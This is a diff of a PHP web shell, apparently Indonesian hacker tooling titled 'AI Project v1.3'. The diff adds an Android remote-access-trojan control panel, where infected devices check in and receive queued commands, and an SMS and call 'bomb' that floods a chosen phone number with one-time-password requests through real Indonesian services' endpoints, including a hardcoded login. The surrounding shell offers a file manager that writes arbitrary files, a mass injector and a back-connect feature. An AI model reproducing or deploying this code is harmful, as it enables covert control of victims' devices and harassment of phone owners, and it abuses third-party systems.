@@ -1,12 +1,38 @@
 <?php
 session_start();
+date_default_timezone_set("Asia/Jakarta");
 
-echo '<!DOCTYPE HTML>
+if(isset($_GET['rat-android-siapa'])) {
+        $path = dirname(__FILE__)."/rat/android/target/";
+        if (!file_exists($path)) {
+             mkdir($path, 0777, true);
+        }
+        $siapa = $_GET['rat-android-siapa'];
+        $file = fopen($path.$siapa, "w");
+	fwrite($file, "");
+	fclose($file);
+
+        $data = [ "target" => $_SESSION['rat-android-target'],
+                  "aksi" => $_SESSION['rat-android-aksi']
+        ];
+
+        echo json_encode($data);
+}
+elseif(isset($_GET['rat-android-target'])) {
+        $_SESSION['rat-android-target'] = $_GET['rat-android-target'];
+        echo("<script>location.href = '?backdoor';</script>");
+}
+else {
+        echo '<!DOCTYPE HTML>
 <html>
 <head>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalabe=no"/>
+
+
 <link href="" rel="stylesheet" type="text/css">
-<title>AI Project v1.2</title>
+<title>AI Project v1.3</title>
 <style>
+
 body{
 background-color: black;
 color:white;
@@ -38,7 +64,8 @@ border-radius:5px;
 </style>
 </head>
 <body>
-<h1><center><font color="aqua">AI Project v1.2</font></center></h1>
+
+<h1><center><font color="aqua">AI Project v1.3</font></center></h1>
 
 <center>
 			<a href="?server_info">
@@ -50,7 +77,7 @@ border-radius:5px;
 			<a href="?php_info">
 				<input type="submit" value="Php Info" />
 			</a>&nbsp;&nbsp;&nbsp;&nbsp;
-			<a href="?indox_tools">
+			<a href="?indox_tools"><br>
 				<input type="submit" value="Indoxploit Tools" />
 			</a>&nbsp;&nbsp;&nbsp;&nbsp;
 			<a href="?mass_injector">
@@ -58,19 +85,27 @@ border-radius:5px;
 			</a>&nbsp;&nbsp;&nbsp;&nbsp;
 			<a href="?uploader">
 				<input type="submit" value="Uploader" />
-			</a>&nbsp;&nbsp;&nbsp;&nbsp;
+			</a>&nbsp;&nbsp;&nbsp;&nbsp;<br>
 			<a href="?domains">
 				<input type="submit" value="Domains" />
 			</a>&nbsp;&nbsp;&nbsp;&nbsp;
 			<a href="?back_connecter">
 				<input type="submit" value="Back Connecter" />
+			</a>&nbsp;&nbsp;&nbsp;&nbsp;<br>
+			<a href="?proxy">
+				<input type="submit" value="Proxy" />
 			</a>&nbsp;&nbsp;&nbsp;&nbsp;
-			<a href="?die">
-				<input type="submit" value="Die" />
+                        <a href="?backdoor">
+				<input type="submit" value="Backdoor" />
 			</a>&nbsp;&nbsp;&nbsp;&nbsp;
+                        <a href="?sms_spam"><br>
+				<input type="submit" value="Spam sms" />
+			</a>&nbsp;&nbsp;&nbsp;&nbsp;
+
 </center><br><br>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>';
+}
 
 if(isset($_GET['server_info'])) {
 	$output[] = "SERVER IP ".color(1, 2, $GLOBALS['SERVERIP'])." / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
@@ -88,6 +123,175 @@ if(isset($_GET['server_info'])) {
 	print "<pre>";
 	print implode("<br>", $output);
 	print "</pre>";
+}
+
+if(isset($_GET['backdoor']))
+{
+	if ($_SESSION['opt-rat'] != null) {
+		backdoor($_SESSION['opt-rat']);
+	}
+        else {
+                echo '</center></td>
+		<td><form method="POST" action="">
+		<select name="opt-rat">
+		<option value="">Pilih OS</option>
+		<option value="android">Android</option>
+		<option value="windows">Windows</option>
+		<option value="linux">Linux</option>
+		<option value="iphone">Iphone</option>
+
+		</select>
+		<input type="submit" value=">">
+		</form></td>
+		</tr>';
+                if (isset($_POST['opt-rat'])) {
+                     $_SESSION['opt-rat'] = $_POST['opt-rat'];
+                     echo("<script>location.href = '?backdoor';</script>");
+                }
+        }
+}
+
+
+
+if(isset($_GET['sms_spam'])) {
+	if (isset($_POST['sms_nomor']) && isset($_POST['sms_jumlah']) && isset($_POST['sms_jeda'])) {
+		$nomor = $_POST['sms_nomor'];
+		$jumlah = $_POST['sms_jumlah']; /* untuk tokopedia mengaunakan type 1 sms 2 call */
+		$jeda = $_POST['sms_jeda'];
+
+		$tools = $_SESSION['sms_spam'];
+
+		if ($tools == 'jdid') {
+			$execute = jdid_smsbom($nomor, $jumlah, $jeda);
+			print $execute;
+			print "DONE ALL SEND\n";
+		}
+		elseif ($tools == 'telkomsel') {
+			$execute = telk_smsbom($nomor, $jumlah, $jeda);
+			print $execute;
+		}
+		elseif ($tools == 'phd') {
+			$init = new PhdSmsBom();
+			$init->no = $nomor;
+			for ($i=0; $i<$jumlah; $i++) {
+				$init->Verif($init->no);
+			}
+		}
+		elseif ($tools == 'mataharimall') {
+			$init = new MataharimallSmsBom();
+			$init->email = "zumupolij@c1oramn.com";
+			$init->pass = "Hilih kintil";
+			$init->Login($init->email,$init->pass);
+			$init->no = $nomor;
+
+			for ($i=0; $i<$jumlah; $i++) { 
+				$init->Verif($init->no);
+			}
+		}
+		elseif ($tools == 'tokopedia') {
+			$init = new TokopediaSmsBom();
+			$init->no = $nomor;
+			$init->type = $jumlah;
+
+			if ($init->type == 1) {
+				for ($i=0; $i<2; $i++) { 
+					$init->Verif($init->no,$init->type);
+				}
+			}elseif ($init->type == 2) {
+				$init->Verif($init->no,$init->type);
+			}
+		}
+		
+	}
+
+	elseif ($_POST['sms'] == 'jdid') {
+		$_SESSION['sms_spam'] = 'jdid';
+
+		echo color(1, 2, "Spam sms menggunakan server JDID");
+
+		print "<form method='post' action='' style='margin-top: 15px;'>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_nomor' value='Nomor? (ex : 8xxxx)'required><br>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jumlah' value='Jumlah?'required><br>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jeda' value='Jeda? 0-9999999999 (ex:0)'required><br>
+			<br><input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='BOM..'>
+			</form>";
+	}
+	elseif ($_POST['sms'] == 'telkomsel') {
+		$_SESSION['sms_spam'] = 'telkomsel';
+
+		echo color(1, 2, "Spam sms menggunakan server TELKOMSEL");
+
+		print "<form method='post' action='' style='margin-top: 15px;'>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_nomor' value='Nomor? (ex : 628xxxx)'required><br>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jumlah' value='Jumlah?'required><br>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jeda' value='Jeda? 0-99999 (ex:1)'required><br>
+			<br><input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='BOM..'>
+			</form>";
+	}
+	elseif ($_POST['sms'] == 'phd') {
+		$_SESSION['sms_spam'] = 'phd';
+
+		echo color(1, 2, "Spam sms menggunakan server PHD");
+
+		print "<form method='post' action='' style='margin-top: 15px;'>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_nomor' value='Nomor Target (tanpa 0/62)'required><br>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jumlah' value='Jumlah?'required><br>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jeda' value='Jeda? 0-9999999999 (ex:0)'required><br>
+			<br><input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='BOM..'>
+			</form>";
+	}
+	elseif ($_POST['sms'] == 'mataharimall') {
+		$_SESSION['sms_spam'] = 'mataharimall';
+
+		echo color(1, 2, "Spam sms menggunakan server MATAHARIMALL");
+
+		print "<form method='post' action='' style='margin-top: 15px;'>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_nomor' value='Nomor Target (pakai 62)'required><br>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jumlah' value='Jumlah?'required><br>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jeda' value='Jeda? 0-9999999999 (ex:0)'required><br>
+			<br><input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='BOM..'>
+			</form>";
+	}
+	elseif ($_POST['sms'] == 'grab') {
+		$_SESSION['sms_spam'] = 'grab';
+
+		echo color(1, 2, "Spam sms menggunakan server GRAB");
+
+		echo "kode menggunakan python selengkapnya di https://github.com/nee48";
+	}
+	elseif ($_POST['sms'] == 'tokopedia') {
+		$_SESSION['sms_spam'] = 'tokopedia';
+		echo color(1, 2, "Spam sms menggunakan server TOKOPEDIA");
+
+		print "<form method='post' action='' style='margin-top: 15px;'>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_nomor' value='Nomor Target (tanpa 62/0)'required><br>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jumlah' value='Type 1 for sms, 2 for call'required><br>
+			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jeda' value='Jeda? 0-9999999999 (ex:0)'required><br>
+			<br><input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='BOM..'>
+			</form>";
+	}
+	else {
+		unset($_SESSION['sms_spam']);
+		echo '</center></td>
+		<td><center><form method="POST" action="">
+		<select name="sms">
+		<option value="">Pilih Server</option>
+		<option value="jdid">JDID</option>
+		<option value="telkomsel">TELKOMSEL</option>
+		<option value="phd">PHD</option>
+		<option value="mataharimall">MATAHARIMALL</option>
+		<option value="grab">GRAB</option>
+		<option value="tokopedia">TOKOPEDIA</option>
+		</select>
+
+		<input type="submit" value=">">
+		</form></center></td>
+		</tr>';	
+	}
+}
+
+if(isset($_GET['proxy'])) {
+        echo("<script>location.href = '/ai-web/miniProxy.php';</script>");
 }
 
 //indoxploit tools
@@ -177,7 +381,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 			unset($_SESSION['copy']);
 			unset($_SESSION['copy_name']);
 			echo "<script>alert('sukses copy s=".$source." d=".$destin."');</script>	";
-			echo("<script>location.href = '/ai.php?path=".$_SESSION['path']."';</script>");
+			echo("<script>location.href = '/ai-web/ai.php?path=".$_SESSION['path']."';</script>");
 		} else {
 			echo "<font color='red'> copy file gagal</font>	";
 		}
@@ -192,7 +396,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 						
 			unlink($source);
 			echo "<script>alert('sukses move s=".$source." d=".$destin."');</script>	";
-			echo("<script>location.href = '/ai.php?path=$path';</script>");
+			echo("<script>location.href = '/ai-web/ai.php?path=$path';</script>");
 		} else {
 			echo "<font color='red'> Move file gagal</font>	";
 		}
@@ -231,7 +435,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 					
 	echo '</td></tr><tr><td>';
 
-	//editor text
+
 	if(isset($_GET['filesrc'])){
 		echo "<tr><td>Current File : ";
 		echo $_GET['filesrc'];
@@ -251,7 +455,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 			echo '<script>alert("File sukses created");</script>';
 		}
 
-		echo("<script>location.href = '/ai.php?path=$path';</script>");
+		echo("<script>location.href = '/ai-web/ai.php?path=$path';</script>");
 	}
 	elseif(isset($_POST['newgofolder'])) {
 		$new = $_POST['newfolder'];
@@ -263,7 +467,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 			echo '<script>alert("Folder gagal dibuat");</script>';
 		}
 
-		echo("<script>location.href = '/ai.php?path=$path';</script>");
+		echo("<script>location.href = '/ai-web/ai.php?path=$path';</script>");
 	}
 	elseif(isset($_GET['option']) && $_POST['other'] == 'file' ) {
 		echo '<form method="POST" action="">New File : 
@@ -285,7 +489,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 		} else {
 			unset($_SESSION['stime']);
 		}
-		echo("<script>location.href = '/ai.php?path=".$_SESSION['path']."';</script>");
+		echo("<script>location.href = '/ai-web/ai.php?path=".$_SESSION['path']."';</script>");
 	}
 		
 	//action filemanager
@@ -313,32 +517,55 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 			}
 			echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
 
-		}elseif($_POST['opt'] == 'edit'){
-			if(isset($_POST['src'])){
-				$fp = fopen($_POST['path'],'w');
-				if(fwrite($fp,$_POST['src'])){
-					echo '<font color="green">Berhasil Edit File</font><br/>';
-				}else{
-					echo '<font color="red">Gagal Edit File</font><br/>';
-				}
+		}
+                elseif($_POST['opt'] == 'editfull') {
+                        if(isset($_POST['src'])){
+		             $fp = fopen($_POST['path'],'w');
+		             if(fwrite($fp,$_POST['src'])){
+			        echo '<font color="green">Berhasil Edit File</font><br/>';
+			     }else{
+			        echo '<font color="red">Gagal Edit File</font><br/>';
+			     }
 
-				fclose($fp);
-			}
-			echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save" /> <textarea cols=1000 rows=60 name="src" style="background:#000000;color:#30FF00">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /></form>';
+			     fclose($fp);
+		        }
+                        
+                        echo '<script language="javascript" type="text/javascript" src="/ai-web/editarea/edit_area_full.js"></script>';
+                        echo '<script language="javascript" type="text/javascript">';
+                        echo "editAreaLoader.init({id : 'textarea_1', toolbar: 'save,load,search,go_to_line,|,undo,redo,|, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help', syntax_selection_allow: 'css,html,js,php,python,vb,xml,c,cpp,sql,basic,pas,brainfuck',syntax:'php', start_highlight: true, save_callback:'mysave'});";
+                        echo "function mysave(id, content){  alert(content);  }";
+                        echo "</script>";
+
+                        echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save" /><br><textarea id="textarea_1" name="src" cols="80" rows="15">'.    htmlspecialchars(file_get_contents($_POST["path"]))  .'</textarea></form>';
+                }
+
+                elseif($_POST['opt'] == 'edit'){
+                        if(isset($_POST['src'])){
+		             $fp = fopen($_POST['path'],'w');
+		             if(fwrite($fp,$_POST['src'])){
+			        echo '<font color="green">Berhasil Edit File</font><br/>';
+			     }else{
+			        echo '<font color="red">Gagal Edit File</font><br/>';
+			     }
+
+			     fclose($fp);
+		        }
+                        //echo("<script>location.href ='editor.php?title=".$_POST['path'].'/'.$_POST['name']."';</script>");
+			echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save"/><textarea cols=1000 rows=60 name="src" style="background:#000000;color:#30FF00">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br/></form>';
 
 		}elseif($_POST['opt'] == 'download') {
 			$path = $_POST['path'];
-			echo("<script>location.href = '/download.php?id=$path';</script>");
+			echo("<script>location.href ='/ai-web/download.php?id=$path';</script>");
 
 		}elseif($_POST['opt'] == 'copy') {
 			$_SESSION['copy'] = $path.'/'.$_POST['name'];
 			$_SESSION['copy_name'] = $_POST['name'];
-			echo("<script>location.href = '/ai.php?path=".$_SESSION['path']."';</script>");
+			echo("<script>location.href = '/ai-web/ai.php?path=".$_SESSION['path']."';</script>");
 
 		}elseif($_POST['opt'] == 'move') {
 			$_SESSION['move'] = $path.'/'.$_POST['name'];
 			$_SESSION['move_name'] = $_POST['name'];
-			echo("<script>location.href = '/ai.php?path=".$_SESSION['path']."';</script>");
+			echo("<script>location.href = '/ai-web/ai.php?path=".$_SESSION['path']."';</script>");
 
 		}elseif($_POST['opt'] == 'zip') {
 			$zipper = new FM_Zipper();
@@ -347,7 +574,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 			$res = $zipper->create($zipsource.".zip", $zipsource);
 			if ($res) {
 				echo "<script>alert('Archive sukses ".$zipsource.".zip');</script>";
-				echo("<script>location.href = '/ai.php?path=".$_SESSION['path']."';</script>");
+				echo("<script>location.href = '/ai-web/ai.php?path=".$_SESSION['path']."';</script>");
 			}else{
 				echo "<font color='red'>gagal pack folder</font>";
 			}
@@ -470,6 +697,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 				<option value="chmod">Chmod</option>
 				<option value="rename">Rename</option>
 				<option value="edit">Edit</option>
+                                <option value="editfull">Editfull</option>
 				<option value="copy">Copy</option>
 				<option value="move">Move</option>
 				<option value="download">Download</option>
@@ -489,6 +717,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 				<option value="chmod">Chmod</option>
 				<option value="rename">Rename</option>
 				<option value="edit">Edit</option>
+                                <option value="editfull">Editfull</option>
 				<option value="copy">Copy</option>
 				<option value="move">Move</option>
 				<option value="download">Download</option>
@@ -918,6 +1147,57 @@ function massdelete($dir, $filename) {
 			}
 		}
 	}
+}
+
+function backdoor($os, $args = null) 
+{   
+        if($os == "android") {
+            echo "<font color='green'><h2>Android backdoor selected</h2></font>";
+            echo '<form method="POST" action="?backdoor">
+                  <input type="submit" value="select target" name="rat-android-target"/>&nbsp&nbsp&nbsp'.$_SESSION['rat-android-target'].'<br><br>
+                  <input type="submit" value="List aksi" name="rat-android-aksiList"/>&nbsp&nbsp&nbsp'.$_SESSION['rat-android-aksi'].'<br>
+                  
+                  <textarea cols=30 rows=2 name="rat-android-aksi" style="background:#ffffff;color:#000000"></textarea>
+                  <input type="submit" value="Save" name="rat-android-save"/><br>
+                  <input type="submit" value="Exploit" name="rat-android-exploit"/>
+                  <input type="submit" value="Help" name="rat-android-help"/>
+                  <input type="submit" value="Keluar OS" name="rat-android-keluar"/>
+                  </form>';
+            if (isset($_POST['rat-android-exploit'])) {
+                  $_SESSION['rat-android-aksi'] = $_POST['rat-android-aksi'];
+                  echo("<script>location.href='?backdoor';</script>");
+            }
+            elseif (isset($_POST['rat-android-save'])) {
+            }
+            elseif (isset($_POST['rat-android-help'])) {
+                   echo "zzzzz";
+            }
+            elseif (isset($_POST['rat-android-keluar'])) {
+                   unset($_SESSION['opt-rat']);
+                   echo("<script>location.href='?backdoor';</script>");
+            }
+            elseif(isset($_POST['rat-android-target'])) {
+                   echo "<font color='yellow'><h2>Target menu android</h2></font>";
+                   $dir = getcwd()."/rat/android/target";
+                   if (is_dir($dir)) {
+                         if ($dh = opendir($dir)) {
+                             while($file = readdir($dh)) {
+                                  if($file != "." && $file != "..") {
+                                       $time = date("d-m-Y H:i:s", fileatime($dir.'/'.$file));
+                                       echo "<h4><a href='?rat-android-target=".$file."'>".$file."&nbsp&nbsp&nbsp&nbsp&nbsp".$time."</a></h4>";
+                                  }
+                             }
+                             closedir($dh);
+                         }
+                   }
+             }
+             
+        }
+        else {
+            unset($_SESSION['opt-rat']);
+            echo "<script>alert('untuk ".$os." belum dibuat');</script>";
+        }
+
 }
 
 function idx_tools($toolsname, $args = null) {
@@ -1700,5 +1980,172 @@ class FM_Zipper_Tar
         }
         return false;
     }
+}
+
+Class PhdSmsBom {
+	public $no;
+	public function sendC($url, $page, $params) {
+		$ch = curl_init(); 
+		curl_setopt ($ch, CURLOPT_URL, $url.$page); 
+		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
+		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
+
+		if(!empty($params)) {
+			curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
+			curl_setopt ($ch, CURLOPT_POST, 1); 
+		}
+
+		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
+		curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
+		curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
+		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
+
+		$headers  = array();
+		$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
+		$headers[] = 'X-Requested-With: XMLHttpRequest';
+
+		curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
+		//curl_setopt ($ch, CURLOPT_HEADER, 1);
+		$result = curl_exec ($ch);
+		curl_close($ch);
+		return $result;
+	}
+	private function getStr($start, $end, $string) {
+		if (!empty($string)) {
+			$setring = explode($start,$string);
+			$setring = explode($end,$setring[1]);
+			return $setring[0];
+		}
+	}
+	public function Verif()
+	{
+		$url = "https://www.phd.co.id/en/users/sendOTP";
+		$no = $this->no;
+		$data = "phone_number={$no}";
+		$send = $this->sendC($url, null, $data);
+		if (preg_match('/We have sent an OTP to your phone, Please enter the 4 digit code./', $send)) {
+			print('OTP berhasil Dikirim!<br>');
+		} else {
+			print('OTP Gagal Dikirim!<br>');
+		}
+	}    
+}
+Class MataharimallSmsBom {
+	public $no;
+	public $email;
+	public $pass;
+	public function sendC($url, $page, $params) {
+		$ch = curl_init(); 
+		curl_setopt ($ch, CURLOPT_URL, $url.$page); 
+		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
+		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
+
+		if(!empty($params)) {
+			curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
+			curl_setopt ($ch, CURLOPT_POST, 1); 
+		}
+
+		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
+		curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
+		curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
+		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
+
+		$headers  = array();
+		$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
+		$headers[] = 'X-Requested-With: XMLHttpRequest';
+
+		curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
+		//curl_setopt ($ch, CURLOPT_HEADER, 1);
+		$result = curl_exec ($ch);
+		curl_close($ch);
+		return $result;
+	}
+	private function getStr($start, $end, $string) {
+		if (!empty($string)) {
+			$setring = explode($start,$string);
+			$setring = explode($end,$setring[1]);
+			return $setring[0];
+		}
+	}
+	public function Login($email,$pass)
+	{
+		$url = "https://www.mataharimall.com/user/ajax/login";
+		$email = $this->email;
+		$pass = $this->pass;
+		$data = "email={$email}&passwd={$pass}";
+		$send = $this->sendC($url, null, $data);
+		if (preg_match('/sukses/', $send)) {
+			// print('Login Sukses!<br>');
+		} else {
+			// print("Login Gagal!<br>");
+		}
+	}
+	public function Verif()
+	{
+		$url = "https://www.mataharimall.com/user/ajax/requestotp";
+		$no = $this->no;
+		$data = "phone_number={$no}";
+		$send = $this->sendC($url, null, $data);
+		if (preg_match('/Kode OTP berhasil dikirim/', $send)) {
+			print('OTP berhasil Dikirim!<br>');
+		} else {
+			print('OTP Gagal Dikirim!<br>');
+		}
+	}
+}
+Class TokopediaSmsBom {
+	public $no;
+	public $type;
+	public function sendC($url, $page, $params) {
+		$ch = curl_init(); 
+		curl_setopt ($ch, CURLOPT_URL, $url.$page); 
+		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
+		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
+
+		if(!empty($params)) {
+			curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
+			curl_setopt ($ch, CURLOPT_POST, 1); 
+		}
+
+		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
+		curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
+		curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
+		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
+
+		$headers  = array();
+		$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
+		$headers[] = 'X-Requested-With: XMLHttpRequest';
+
+		curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
+		//curl_setopt ($ch, CURLOPT_HEADER, 1);
+		$result = curl_exec ($ch);
+		curl_close($ch);
+		return $result;
+	}
+	private function getStr($start, $end, $string) {
+		if (!empty($string)) {
+			$setring = explode($start,$string);
+			$setring = explode($end,$setring[1]);
+			return $setring[0];
+		}
+	}
+	public function Verif()
+	{
+		$url = "https://www.tokocash.com/oauth/otp";
+		$no = $this->no;
+		$type = $this->type;
+		if ($type == 1) {
+			$data = "msisdn={$no}&accept=";
+		}elseif ($type == 2) {
+			$data = "msisdn={$no}&accept=call";
+		}
+		$send = $this->sendC($url, null, $data);
+		// echo $send;
+		if (preg_match('/otp_attempt_left/', $send)) {
+			print('OTP berhasil Dikirim!<br>');
+		} else {
+			print('OTP Gagal Dikirim!<br>');
+		}
+	}
 }
 ?>
